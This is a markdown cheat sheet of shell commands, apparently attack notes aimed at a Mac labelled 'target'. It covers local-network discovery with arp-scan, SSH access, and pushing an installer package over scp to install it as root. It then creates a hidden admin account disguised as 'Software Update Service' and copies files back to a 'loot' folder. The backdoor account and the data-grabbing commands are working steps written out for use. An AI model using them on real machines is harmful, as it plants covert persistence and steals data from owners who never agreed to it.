
```bash
ip -br link show
```

To find the interface/Wi-Fi that you are on.

```bash
sudo arp-scan -I {interface} --localnet
```

To find the IP addresses as well as the OS of the machines on your local network.

Example :

```bash
>  ip -br link show  
lo               UNKNOWN        00:00:00:00:00:00 <LOOPBACK,UP,LOWER_UP>    
wlp3s0           DOWN           fe:1c:0d:14:f2:2d <NO-CARRIER,BROADCAST,MULTICAST,UP>    
eno1             DOWN           e8:d8:d1:ef:d7:51 <NO-CARRIER,BROADCAST,MULTICAST,UP>    
enp4s0f3u2u1     DOWN           00:e0:4c:57:4d:18 <NO-CARRIER,BROADCAST,MULTICAST,UP>    
tailscale0       UNKNOWN        <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP>    
br-30556f4e1f44  DOWN           26:4e:fe:24:7c:c0 <NO-CARRIER,BROADCAST,MULTICAST,UP>    
docker0          DOWN           06:87:96:ff:14:dd <NO-CARRIER,BROADCAST,MULTICAST,UP>    
tun1             UNKNOWN        <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP>    
wlp4s0f3u1       UP             00:c0:ca:b8:aa:8a <BROADCAST,MULTICAST,UP,LOWER_UP>    
tun0             UNKNOWN        <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP>    
pvpnksintrf1     UNKNOWN        32:ee:5b:7e:15:47 <BROADCAST,NOARP,UP,LOWER_UP>    
>  wlp4s0f3u1       UP             00:c0:ca:b8:aa:8a <BROADCAST,MULTICAST,UP,LOWER_UP>  
  
>  sudo arp-scan -I wlp4s0f3u1 --localnet  
Interface: wlp4s0f3u1, type: EN10MB, MAC: 00:c0:ca:b8:aa:8a, IPv4: 192.168.1.193  
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)  
192.168.1.1     74:24:9f:c8:67:32       TIBRO Corp.  
192.168.1.42    fe:c3:63:6e:63:53       (Unknown: locally administered)  
192.168.1.75    3c:a6:f6:96:1a:75       Apple, Inc.  
192.168.1.95    78:22:88:98:d3:93       (Unknown)  
192.168.1.150   74:24:9f:0e:28:5a       TIBRO Corp.  
192.168.1.154   e0:37:17:0f:65:5a       Technicolor CH USA Inc.  
192.168.1.197   50:03:cf:0c:60:85       (Unknown)  
  
7 packets received by filter, 0 packets dropped by kernel  
Ending arp-scan 1.10.0: 256 hosts scanned in 2.081 seconds (123.02 hosts/sec). 7 responded  
>  ssh target@192.168.1.75
```

# Tranferring files via SCP

On host :

```bash
scp /path/to/file target@{TARGET IP}:/Users/target/Downloads/
```

Example :

```bash
>  scp /home/vagabond/Documents/dmg/avast_one_online.dmg target@192.168.1.75:/Users/target/Downloads
```

And then on target, to mount the app (if it's a .dmg) :

```bash
>  hdiutil attach ~/Downloads/avast_one_online.dmg
>  cd /Volumes/Avast*
>  ls
target@target Avast One % ls  
Avast One.pkg   config.tar
> sudo installer -pkg "Avast One.pkg" -target /
```


# Creating an admin user

Hidden :

```bash
target@target ~ % sudo sysadminctl -addUser hound \    

    -fullName "Software Update Service" \

    -password "PutAStrongPasswordHere" \           

    -admin \

    -UID 444 \

    -hidden
```

# Downloading files via SCP

```bash
scp target@IP:/Users/target/Desktop/interesting.txt ~/loot/
scp -r target@IP:/Users/target/Directory ~/Downloads
```
